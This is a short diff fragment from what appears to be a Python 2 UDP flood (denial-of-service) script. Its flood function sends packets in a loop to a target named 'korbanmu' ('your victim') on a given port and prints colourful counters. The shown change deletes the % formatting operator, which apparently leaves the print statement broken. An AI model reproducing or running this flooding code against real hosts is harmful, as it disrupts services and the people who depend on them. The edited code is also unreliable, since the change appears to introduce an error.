@@ -54,7 +54,7 @@ def flood(korbanmu, vport, durasi):
         client.sendto(bytes, (korbanmu, vport))
         sent = sent + 1
         print bcolors.HEADER + "[\033[92m%s\033[95m] UDP [\033[91m%s\033[95m] PORT [\033[94m%s\033[95m] " 
-        %(sent, korbanmu, vport)
+        (sent, korbanmu, vport)
 def main():
     print len(sys.argv)
     if len(sys.argv) != 4:
